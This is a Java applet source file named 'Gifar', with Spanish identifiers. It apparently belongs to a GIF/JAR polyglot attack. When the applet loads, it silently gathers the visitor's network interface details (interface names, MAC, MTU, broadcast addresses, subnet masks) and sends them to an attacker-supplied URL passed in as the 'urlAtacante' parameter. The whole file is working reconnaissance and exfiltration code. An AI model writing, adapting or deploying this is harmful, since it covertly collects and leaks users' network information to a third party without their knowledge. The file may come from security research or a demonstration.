import javax.swing.JApplet;
import java.awt.Graphics;
import java.net.NetworkInterface;
import java.net.InterfaceAddress;
import java.net.InetAddress;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Enumeration;
import java.nio.*;
import java.io.DataOutputStream;

public class Gifar extends JApplet {
	static final long serialVersionUID = 0;
	public void init() {
		HttpURLConnection http = null;
		try {
			String peticion = getParameter("urlAtacante");
			StringBuffer cliente = new StringBuffer();
			Enumeration e = NetworkInterface.getNetworkInterfaces();
			int direccionDetectada = 1;
			while(e.hasMoreElements()) {
				NetworkInterface ni = (NetworkInterface) e.nextElement();
				cliente.append("INTERFAZ DE RED DETECTADA, Inicio de Traza...");
				cliente.append("\nDIRECCIÓN DETECTADA NÚMERO: "+direccionDetectada);
				cliente.append("\nNet interface: "+ni.getName());
				cliente.append("\nMAC: "+ni.getHardwareAddress()+"");
				cliente.append("\nMTU: "+ni.getMTU());
				cliente.append("\nPoint to Point? "+ni.getMTU());
				cliente.append("\nes UP? "+ni.isUp());
				cliente.append("\nes Virtual? "+ni.isVirtual());
				cliente.append("\nSoporta Multicast? "+ni.supportsMulticast() );
				List<InterfaceAddress> subSetIface = ni.getInterfaceAddresses();
				for(InterfaceAddress interfaceAddress : subSetIface) {
					cliente.append("\n --- BROADCAST: "+interfaceAddress.getBroadcast());
					cliente.append("\n --- MASCARA DE SUBRED "+interfaceAddress.getNetworkPrefixLength());
				}
				cliente.append("\nFin de Traza...\n\n\n");
				direccionDetectada = direccionDetectada+1;
			}
			URL rutaPeticion = new URL(peticion);
			http = (HttpURLConnection)rutaPeticion.openConnection();
			http.setRequestProperty("Content-type", "text/html");
			http.setUseCaches(false);
			http.setDoOutput(true);
			http.setDoInput(true);
			http.setRequestMethod("GET");
			DataOutputStream wr = new DataOutputStream (http.getOutputStream ());
			wr.writeBytes (cliente.toString());
			wr.flush ();
			wr.close ();
		} catch(Exception ex) {
			System.out.println("Excepción: "+ex.getMessage());
		} finally {
			if(http != null) {
				http.disconnect();
			}
		}
	}
}
